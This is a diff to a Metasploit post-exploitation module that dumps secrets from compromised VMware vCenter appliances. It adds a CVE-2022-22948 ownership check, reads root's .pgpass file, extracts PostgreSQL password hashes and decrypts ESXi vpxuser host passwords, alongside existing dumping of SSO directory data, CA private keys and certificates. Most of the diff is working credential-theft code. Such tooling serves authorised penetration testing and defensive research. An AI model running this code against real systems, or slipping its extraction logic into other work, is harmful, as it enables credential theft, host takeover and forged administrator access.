@@ -10,9 +10,10 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Common
   include Msf::Post::File
   include Msf::Auxiliary::Report
+  include Msf::Post::Linux::Priv
   include Msf::Post::Vcenter::Vcenter
+  include Msf::Post::Vcenter::Database
 
-  Rank = ManualRanking
   def initialize(info = {})
     super(
       update_info(
@@ -35,7 +36,11 @@ class MetasploitModule < Msf::Post
           associated private keys are also plundered and can be used to
           sign forged SAML assertions for the /ui admin interface.
         },
-        'Author' => 'npm[at]cesium137.io',
+        'Author' => [
+          'npm[at]cesium137.io', # original vcenter secrets dump
+          'Erik Wynter', # @wyntererik, postgres additions
+          'h00die' # tying it all together
+        ],
         'Platform' => [ 'linux', 'unix' ],
         'DisclosureDate' => '2022-04-15',
         'SessionTypes' => [ 'meterpreter', 'shell' ],
@@ -49,12 +54,17 @@ class MetasploitModule < Msf::Post
           ]
         ],
         'DefaultAction' => 'Dump',
+        'References' => [
+          [ 'URL', 'https://github.com/shmilylty/vhost_password_decrypt' ],
+          [ 'CVE', '2022-22948' ],
+          [ 'URL', 'https://pentera.io/blog/information-disclosure-in-vmware-vcenter/' ],
+          [ 'URL', 'https://github.com/ErikWynter/metasploit-framework/blob/vcenter_gather_postgresql/modules/post/multi/gather/vmware_vcenter_gather_postgresql.rb' ]
+        ],
         'Notes' => {
           'Stability' => [ CRASH_SAFE ],
-          'Reliability' => [ REPEATABLE_SESSION ],
-          'SideEffects' => [ IOC_IN_LOGS, ARTIFACTS_ON_DISK ]
-        },
-        'Privileged' => true
+          'Reliability' => [ ],
+          'SideEffects' => [ IOC_IN_LOGS ]
+        }
       )
     )
     register_advanced_options([
@@ -66,14 +76,8 @@ class MetasploitModule < Msf::Post
   end
 
   # this is only here because of the SSO portion, which will get moved to the vcenter lib once someone is able to provide output to test against.
-  def vsphere_bin
-    {
-      'ldapsearch' => '/opt/likewise/bin/ldapsearch'
-    }
-  end
-
   def ldapsearch_bin
-    vsphere_bin['ldapsearch']
+    '/opt/likewise/bin/ldapsearch'
   end
 
   def psql_bin
@@ -88,34 +92,93 @@ class MetasploitModule < Msf::Post
     vc_type_embedded || vc_type_infrastructure
   end
 
+  def check_cve_2022_22948
+    # https://github.com/PenteraIO/CVE-2022-22948/blob/main/CVE-2022-22948-scanner.sh#L5
+    cmd_exec('stat -c "%G" "/etc/vmware-vpx/vcdb.properties"') == 'cis'
+  end
+
   def run
     get_vcsa_version
 
-    print_status('Validating target ...')
-    validate_target
-
-    print_status('Gathering vSphere SSO domain information ...')
-    vmdir_init
-
-    if print_status('Extracting PostgreSQL database credentials ...')
-      get_db_creds
-
-      print_status('Extract ESXi host vpxuser credentials ...')
-      enum_vpx_user_creds
+    if check_cve_2022_22948
+      print_good('Vulnerable to CVE-2022-22948')
+      report_vuln(
+        host: rhost,
+        port: rport,
+        name: name,
+        refs: ['CVE-2022-22948'],
+        info: "Module #{fullname} found /etc/vmware-vpx/vcdb.properties owned by cis group"
+      )
     end
 
+    print_status('Validating target')
+    validate_target
+
+    print_status('Gathering vSphere SSO domain information')
+    vmdir_init
+
+    print_status('Extracting PostgreSQL database credentials')
+    get_db_creds
+
+    print_status('Extract ESXi host vpxuser credentials')
+    enum_vpx_user_creds
+
     if datastore['DUMP_VMDIR'] && vcenter_infrastructure
-      print_status('Extracting vSphere SSO domain secrets ...')
+      print_status('Extracting vSphere SSO domain secrets')
       vmdir_dump
     end
 
     if datastore['DUMP_VMAFD']
-      print_status('Extracting certificates from vSphere platform ...')
+      print_status('Extracting certificates from vSphere platform')
       vmafd_dump
       if datastore['DUMP_SPEC'] && vcenter_management
-        print_status('Searching for secrets in VM Guest Customization Specification XML ...')
+        print_status('Searching for secrets in VM Guest Customization Specification XML')
         enum_vm_cust_spec
       end
+    end
+
+    if is_root?
+      print_status('Retrieving .pgpass file')
+      retrieved_pg_creds = false
+      pgpass_contents = process_pgpass_file
+
+      pgpass_contents.each do |p|
+        extra_service_data = {
+          address: p['hostname'] =~ /localhost|127.0.0.1/ ? Rex::Socket.getaddress(rhost) : p['hostname'],
+          port: p['port'],
+          service_name: 'psql',
+          protocol: 'tcp',
+          workspace_id: myworkspace_id,
+          module_fullname: fullname,
+          origin_type: :service
+        }
+        print_good(".pgpass creds found: #{p['username']}, #{p['password']} for #{p['hostname']}:#{p['database']}")
+        store_valid_credential(user: p['username'], private: p['password'], service_data: extra_service_data, private_type: :password)
+        next if p['database'] != 'postgres'
+
+        next unless retrieved_pg_creds == false
+
+        creds = query_pg_shadow_values(p['password'], p['username'], p['database'])
+        retrieved_pg_creds = true unless creds.nil?
+        creds.each do |cred|
+          print_good("posgres database creds found: #{cred['user']}, #{cred['password_hash']}")
+          credential_data = {
+            username: cred['user'],
+            private_data: cred['password_hash'],
+            private_type: :nonreplayable_hash,
+            jtr_format: Metasploit::Framework::Hashes.identify_hash(cred['password_hash'])
+          }.merge(extra_service_data)
+
+          login_data = {
+            core: create_credential(credential_data),
+            status: Metasploit::Model::Login::Status::UNTRIED
+          }.merge(extra_service_data)
+
+          create_credential_login(login_data)
+        end
+      end
+      path = store_loot('.pgpass', 'text/plain', session, pgpass_contents, 'pgpass.json')
+      print_good("Saving the /root/.pgpass contents to #{path}")
     end
   end
 
@@ -141,7 +204,7 @@ class MetasploitModule < Msf::Post
     self.base_dn = vsphere_domain_dn
     vprint_status("vSphere SSO Domain DN: #{base_dn}")
 
-    vprint_status('Extracting dcAccountDN and dcAccountPassword via lwregshell on local vCenter ...')
+    vprint_status('Extracting dcAccountDN and dcAccountPassword via lwregshell on local vCenter')
     vsphere_domain_dc_dn = get_domain_dc_dn
     unless is_dn?(vsphere_domain_dc_dn)
       fail_with(Msf::Exploit::Failure::Unknown, 'Could not determine vmdir dcAccountDN from lwregshell')
@@ -188,23 +251,23 @@ class MetasploitModule < Msf::Post
     p = store_loot('vmdir', 'LDIF', rhost, vmdir_ldif, 'vmdir.ldif', 'vCenter vmdir LDIF dump')
     print_good("LDIF Dump: #{p}")
 
-    print_status('Processing vmdir LDIF (this may take several minutes) ...')
+    print_status('Processing vmdir LDIF (this may take several minutes)')
     ldif_file = ::File.open(p, 'rb')
     ldif_data = Net::LDAP::Dataset.read_ldif(ldif_file)
 
-    print_status('Processing LDIF entries ...')
+    print_status('Processing LDIF entries')
     entries = ldif_data.to_entries
 
-    print_status('Processing SSO account hashes ...')
+    print_status('Processing SSO account hashes')
     vmware_sso_hash_entries = entries.select { |entry| entry[:userpassword].any? }
     process_hashes(vmware_sso_hash_entries)
 
-    print_status('Processing SSO identity sources ...')
+    print_status('Processing SSO identity sources')
     vmware_sso_id_entries = entries.select { |entry| entry[:vmwSTSConnectionStrings].any? }
     process_sso_providers(vmware_sso_id_entries)
 
     if datastore['DUMP_LIC']
-      print_status('Extract licenses from vCenter platform ...')
+      print_status('Extract licenses from vCenter platform')
       vmware_license_entries = entries.select { |entry| entry[:vmwLicSvcLicenseSerialKeys].any? }
       get_vc_licenses(vmware_license_entries)
     end
@@ -237,7 +300,7 @@ class MetasploitModule < Msf::Post
   def get_vecs_entry(store_name, vecs_entry)
     store_label = store_name.upcase
 
-    vprint_status("Extract #{store_label} key ...")
+    vprint_status("Extract #{store_label} key")
     key = get_vecs_private_key(store_name, vecs_entry['Alias'])
     if key.nil?
       print_bad("Could not extract #{store_label} private key")
@@ -246,7 +309,7 @@ class MetasploitModule < Msf::Post
       print_good("#{store_label} Key: #{p}")
     end
 
-    vprint_status("Extract #{store_label} certificate ...")
+    vprint_status("Extract #{store_label} certificate")
     cert = validate_x509_cert(vecs_entry['Certificate'])
     if cert.nil?
       print_bad("Could not extract #{store_label} certificate")
@@ -261,7 +324,7 @@ class MetasploitModule < Msf::Post
   end
 
   def get_vmca_cert
-    vprint_status('Extract VMCA_ROOT key ...')
+    vprint_status('Extract VMCA_ROOT key')
 
     unless file_exist?('/var/lib/vmware/vmca/privatekey.pem') && file_exist?('/var/lib/vmware/vmca/root.cer')
       print_error('Could not locate VMCA_ROOT keypair')
@@ -279,7 +342,7 @@ class MetasploitModule < Msf::Post
     p = store_loot('vmca', 'PEM', rhost, vmca_key, 'VMCA_ROOT.key', 'vCenter VMCA root CA private key')
     print_good("VMCA_ROOT key: #{p}")
 
-    vprint_status('Extract VMCA_ROOT cert ...')
+    vprint_status('Extract VMCA_ROOT cert')
     vmca_cert_b64 = read_file('/var/lib/vmware/vmca/root.cer')
 
     vmca_cert = validate_x509_cert(vmca_cert_b64)
@@ -488,7 +551,7 @@ class MetasploitModule < Msf::Post
   end
 
   def get_idp_creds
-    vprint_status('Fetching objectclass=vmwSTSTenantCredential via vmdir LDAP ...')
+    vprint_status('Fetching objectclass=vmwSTSTenantCredential via vmdir LDAP')
     idp_keys = get_idp_keys(base_fqdn, vc_psc_fqdn, base_dn, bind_dn, shell_bind_pw)
     if idp_keys.nil?
       print_error('Error processing IdP trusted certificate private key')
@@ -501,7 +564,7 @@ class MetasploitModule < Msf::Post
       return
     end
 
-    vprint_status('Parsing vmwSTSTenantCredential certificates and keys ...')
+    vprint_status('Parsing vmwSTSTenantCredential certificates and keys')
 
     # vCenter vmdir stores the STS IdP signing credential under the following DN:
     #    cn=TenantCredential-1,cn=<sso domain>,cn=Tenants,cn=IdentityManager,cn=Services,<root dn>
@@ -590,7 +653,7 @@ class MetasploitModule < Msf::Post
       enc_cert_der = []
       der_idx = 0
 
-      print_status('Validating data encipherment key ...')
+      print_status('Validating data encipherment key')
       while der_idx <= enc_cert_len - 1
         enc_cert_der << xmldoc.at_xpath("/ConfigRoot/encryptionKey/e[@id=#{der_idx}]").text.to_i
         der_idx += 1
@@ -759,13 +822,55 @@ class MetasploitModule < Msf::Post
     }
 
     store_valid_credential(user: vcdb_user, private: vcdb_pass, service_data: extra_service_data)
+    print_status('Checking for VPX Users')
+    creds = query_vpx_creds(vcdb_pass, vcdb_user, vcdb_name, vc_sym_key_raw)
+    if creds.nil?
+      print_bad('No VPXUSER entries were found')
+      return
+    end
+    creds.each do |cred|
+      extra_service_data = {
+        address: cred['ip_address'],
+        service_name: 'vpx',
+        protocol: 'tcp',
+        workspace_id: myworkspace_id,
+        module_fullname: fullname,
+        origin_type: :service,
+        realm_key: Metasploit::Model::Realm::Key::WILDCARD,
+        realm_value: vcdb_name
+      }
+      if cred.key? 'decrypted_password'
+        print_good("VPX Host creds found: #{cred['user']}, #{cred['decrypted_password']} for #{cred['ip_address']}")
+        credential_data = {
+          username: cred['user'],
+          private_data: cred['decrypted_password'],
+          private_type: :password
+        }.merge(extra_service_data)
+      else
+        print_good("VPX Host creds found: #{cred['user']}, #{cred['password_hash']} for #{cred['ip_address']}")
+        credential_data = {
+          username: cred['user'],
+          private_data: cred['password_hash'],
+          private_type: :nonreplayable_hash
+          # this is encrypted, not hashed, so no need for the following line, leaving it as a note
+          # jtr_format: Metasploit::Framework::Hashes.identify_hash(cred['password_hash'])
+        }.merge(extra_service_data)
+      end
+
+      login_data = {
+        core: create_credential(credential_data),
+        status: Metasploit::Model::Login::Status::UNTRIED
+      }.merge(extra_service_data)
+
+      create_credential_login(login_data)
+    end
   end
 
   def validate_sts_cert(test_cert)
     cert = validate_x509_cert(test_cert)
     return false if cert.nil?
 
-    vprint_status('Downloading advertised IDM tenant certificate chain from http://localhost:7080/idm/tenant/ on local vCenter ...')
+    vprint_status('Downloading advertised IDM tenant certificate chain from http://localhost:7080/idm/tenant/ on local vCenter')
 
     idm_cmd = cmd_exec("curl -f -s http://localhost:7080/idm/tenant/#{base_fqdn}/certificates?scope=TENANT")
 
@@ -795,15 +900,6 @@ class MetasploitModule < Msf::Post
   end
 
   def validate_target
-    # this enumeration phase will also go away once the sso part moves to lib
-    vprint_status('Enumerating universal vSphere binaries ...')
-    vsphere_bin.each do |k, v|
-      vprint_good("\t#{k}: #{v}")
-      unless command_exists?(v)
-        fail_with(Msf::Exploit::Failure::NoTarget, "Could not find #{v}")
-      end
-    end
-
     if vcenter_management
       vc_db_type = get_database_type
       unless vc_db_type == 'embedded'
